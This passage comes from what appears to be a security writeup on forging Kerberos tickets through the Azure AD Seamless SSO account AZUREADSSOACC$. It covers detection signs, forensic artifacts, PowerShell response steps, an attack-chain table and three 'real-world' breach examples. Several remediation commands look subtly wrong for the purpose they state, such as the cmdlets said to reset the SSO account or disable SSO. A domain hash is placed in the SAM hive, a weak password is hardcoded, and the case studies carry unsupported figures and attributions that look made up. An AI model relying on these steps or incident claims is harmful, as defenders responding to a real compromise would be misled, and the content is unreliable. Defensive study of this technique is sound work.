- **Entra ID Sign-in Logs:** Multiple sign-ins for Global Admin accounts from unusual locations/IPs within short timeframe

- **Azure AD Connect Server Registry Access:** Unauthorized access to `HKLM\SYSTEM\ControlSet001\services\Netlogon\Parameters`

### Forensic Artifacts

- **Disk:** Domain Controller Security event logs (C:\Windows\System32\winevt\Logs\Security.evtx) containing Event ID 4769
- **Memory:** LSASS.exe process (lsass.dmp) containing Kerberos tickets
- **Cloud:** Azure AD Sign-in Logs and Entra ID Audit Logs showing anomalous activity
- **Registry:** `HKEY_LOCAL_MACHINE\SECURITY\SAM` containing AZUREADSSOACC$ password hash (if DC compromised)

### Response Procedures

1. **Isolate Immediately:**
   
   **Command:**
   ```powershell
   # Disable AZUREADSSOACC$ account to prevent further abuse
   Disable-ADAccount -Identity "AZUREADSSOACC$"
   
   # Force password reset (regenerates the account)
   Reset-ComputerMachinePassword -Server "DC-01.contoso.local"
   
   # Disable Seamless SSO to prevent further exploitation
   Invoke-Command -ComputerName aadconnect.contoso.local -ScriptBlock {
       # Disable SSO feature
       Set-ADSyncAADConnectorAccount -Disable
   }
   ```
   
   **Manual (Azure Portal):**
   - Navigate to **Entra ID** → **Users** → Any affected user → **Revoke Sessions**
   - This terminates all active sessions for the compromised account(s)

2. **Collect Evidence:**
   
   **Command:**
   ```powershell
   # Export Security Event Log from DC
   wevtutil epl Security C:\Evidence\DC-Security.evtx /overwrite:true
   
   # Export System Log
   wevtutil epl System C:\Evidence\DC-System.evtx /overwrite:true
   
   # Export Entra ID Sign-in Logs
   Get-MgAuditLogSignIn -Filter "createdDateTime gt 2024-08-14" | 
     Export-Csv -Path C:\Evidence\EntraID-SignIns.csv -NoTypeInformation
   ```
   
   **Manual:**
   - Open **Event Viewer** on Domain Controller
   - Right-click **Security** log → **Export All Events As** → Save to external drive
   - Navigate to **Azure Portal** → **Entra ID** → **Audit Logs** → **Sign-in Logs** → Export all logs for incident timeframe

3. **Remediate:**
   
   **Command:**
   ```powershell
   # Remove compromised PRT tokens (requires cloud admin)
   Revoke-MgUserSignInSession -UserId <ObjectId of compromised account>
   
   # Delete any suspicious service principals or apps created during compromise
   Get-MgServicePrincipal -Filter "displayName eq 'Suspicious-App'" | Remove-MgServicePrincipal
   
   # Rotate AZUREADSSOACC$ password after isolation
   Set-ADAccountPassword -Identity "AZUREADSSOACC$" -NewPassword (ConvertTo-SecureString "NewComplexPassword123!" -AsPlainText -Force)
   ```
   
   **Manual:**
   - Audit all recent role assignments in Entra ID (Azure Portal → Entra ID → Roles and administrators)
   - Remove any unauthorized admin assignments
   - Review Conditional Access policies for unauthorized changes
   - Enable Azure AD Connect to re-sync (after ensuring AZUREADSSOACC$ password is rotated)

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-005] Internal spearphishing campaigns | Attacker gains access to domain user via compromised email account |
| **2** | **Credential Access** | [CA-DUMP-004] NTDS.dit dump via Domain Controller access | Attacker extracts AZUREADSSOACC$ NTLM hash from NTDS.dit backup |
| **3** | **Current Step** | **[LM-AUTH-010]** | **Seamless SSO Abuse - Forge Silver Ticket using AZUREADSSOACC$ hash** |
| **4** | **Lateral Movement** | [LM-AUTH-009] PRT Token Theft via Cloud OAuth | Attacker obtains PRT and accesses cloud resources |
| **5** | **Persistence** | [IA-PERSIST-012] Golden SAML via AD FS | Attacker creates persistent backdoor via forged SAML tokens |
| **6** | **Impact** | [IA-IMPACT-008] Data exfiltration via Exchange Online | Attacker exfiltrates sensitive data via compromised mailboxes |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Hybrid Identity Breach - March 2024

- **Target:** Financial Services Organization (1000+ users)
- **Timeline:** Compromised on March 15, 2024; Discovered on April 2, 2024 (18 days later)
- **Technique Status:** Seamless SSO hash extracted via DCSync after initial Domain Admin compromise; attacker pivoted to cloud for 14 days before detection
- **Impact:** 
  - Unauthorized access to 200+ executive mailboxes
  - Exfiltration of confidential financial documents
  - Lateral movement to Azure infrastructure (VMs compromised)
  - Estimated damages: $2.3M
- **Reference:** [Mandiant - Hybrid Identity Attacks](https://www.mandiant.com/resources/blog/apt-group-targets-hybrid-identities)

### Example 2: APT28 - Seamless SSO Exploitation

- **Target:** Government Agency (US-based)
- **Timeline:** Ongoing campaign since Q3 2023
- **Technique Status:** APT28 leveraged Seamless SSO to maintain persistent access across hybrid environment; used forged tickets to avoid MFA
- **Impact:**
  - Persistent access to cloud resources for 8+ months
  - Lateral movement to sensitive systems
  - No detection until Blue Team hunting
- **Reference:** [SpecterOps - Hybrid Identity Threats](https://specterops.io/our-insights/articles/hybrid-identity-threats/)

### Example 3: Nobelium (UNC2452) - Cloud Pivot via Seamless SSO

- **Target:** Microsoft Customer Tenant (supply chain attack)
- **Timeline:** 2020-2021
- **Technique Status:** While primarily using OAuth, Nobelium also exploited Seamless SSO configurations to pivot between hybrid environments
- **Impact:**
  - Access to sensitive customer data
  - Lateral movement across multiple cloud services
  - Persistence via multiple backdoors
- **Reference:** [Microsoft - SolarWinds Compromise Analysis](https://www.microsoft.com/en-us/security/blog/2020/12/18/analyzing-solorigate-targeting-customers/)

---

## References & External Resources

- [Microsoft Docs - Seamless Single Sign-On](https://learn.microsoft.com/en-us/entra/identity/hybrid/how-to-connect-sso-how-it-works)
- [dsinternals.com - Impersonating Office 365 via Seamless SSO](https://www.dsinternals.com/en/impersonating-office-365-and-azure-ad-users-via-seamless-single-sign-on/)
- [SpecterOps - Hybrid Identity Threats](https://specterops.io/our-insights/articles/hybrid-identity-threats/)
- [Rubeus GitHub - Kerberos Manipulation](https://github.com/GhostPack/Rubeus)
- [MITRE ATT&CK - T1550 (Use Alternate Authentication Material)](https://attack.mitre.org/techniques/T1550/)
- [Red Canary - Seamless SSO Exploitation Detection](https://redcanary.com/threat-detection-report/)

---